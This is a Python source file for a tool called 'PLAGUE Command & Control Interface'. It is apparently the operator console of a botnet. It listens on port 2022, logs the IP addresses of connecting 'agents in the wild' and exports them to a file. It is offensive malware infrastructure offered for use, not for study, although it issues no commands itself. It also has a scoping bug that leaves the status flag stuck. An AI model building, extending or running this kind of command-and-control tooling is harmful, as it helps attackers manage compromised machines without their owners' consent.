# ============================================ #
# PLAGUE Command & Control Interface 1.0.0     #
# ============================================ #
import socket, sys
from os import system
import colorama
from colorama import Style, Fore, Back
## SETUP ##
# Colors:
colorama.init()
print(Style.BRIGHT)
# Variables:
agents_pool = []         # Agents online.
server_status = False    # True: server is UP / False: server is DOWN.

## FUNCIONS ##
def export_agents():
    if len(agents_pool) > 0:
        with open("agents.txt", "w") as fl:
            for agent in agents_pool:
                fl.write(agent + "\n")
    else:
        pass

def see_status():
    print_logo()
    if server_status:
        print(Fore.CYAN + "[*] " + Fore.RESET + Back.RESET + "Your server is " + Fore.GREEN + "UP" + Fore.RESET + ".")
        print(Fore.CYAN + "[*] " + Fore.YELLOW + "{0} ".format(len(agents_pool)) + Fore.RESET + "agents in the wild." + Fore.RESET)
    else:
        print(Back.RESET + "Your server is " + Fore.RED + "DOWN" + Fore.RESET + ".")
    show_options()

def start_server():
    print(Fore.RESET + "Starting server. Press " + Fore.YELLOW + "CTRL + C " + Fore.RESET + "to close.")
    server_status = True
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((socket.gethostname(), 2022))
    server_socket.listen()
    try:
        while True:
            # Get responses:
            agent, ip = server_socket.accept()
            agents_pool.append(ip[0])
            print_logo()
            print(Fore.CYAN + "[*] " + Fore.RESET + Back.RESET + "Your server is " + Fore.GREEN + "UP" + Fore.RESET + ".")
            print(Fore.CYAN + "[*] " + Fore.YELLOW + "{0} ".format(len(agents_pool)) + Fore.RESET + "agents in the wild." + Fore.RESET)
    except KeyboardInterrupt:
        print(Fore.RESET + "Closing server...")
        server_status = False
        print("Exporting active agents list...")
        export_agents()
        print_logo()
        print(Fore.GREEN + "SUCCESS!" + Fore.RESET)
        show_options()

## INTERFACE ##
def print_logo():
    # Prepare screen:
    system("clear")
    print(Fore.CYAN + Back.RESET + Style.BRIGHT)
    # Print logo:
    print("__________.____       _____    ________ ____ ______________")
    print("\______   \    |     /  _  \  /  _____/|    |   \_   _____/")
    print(" |     ___/    |    /  /_\  \/   \  ___|    |   /|    __)_")
    print(" |    |   |    |___/    |    \    \_\  \    |  / |        \ ")
    print(" |____|   |_______ \____|__  /\______  /______/ /_______  /")
    print("                  \/       \/        \/                 \/\n")

def show_options():
    print(Back.RESET + Fore.YELLOW + "\n[0] " + Fore.RESET  + "Start server")
    print(Back.RESET + Fore.YELLOW + "[1] " + Fore.RESET  + "See status")
    print(Back.RESET + Fore.YELLOW + "[2] " + Fore.RESET  + "Quit")
    option = input(Back.RESET + Fore.YELLOW + ">>> " + Fore.RESET)
    if option == "0":
        start_server()
    elif option == "1":
        see_status()
    elif option == "2":
        print(Fore.RESET + Back.RESET + "Goodbye!" + Style.RESET_ALL)
        sys.exit()
    else:
        print_logo()
        print(Back.RED + Fore.WHITE + "Invalid option.")
        show_options()

if __name__ == "__main__":
    print_logo()
    show_options()
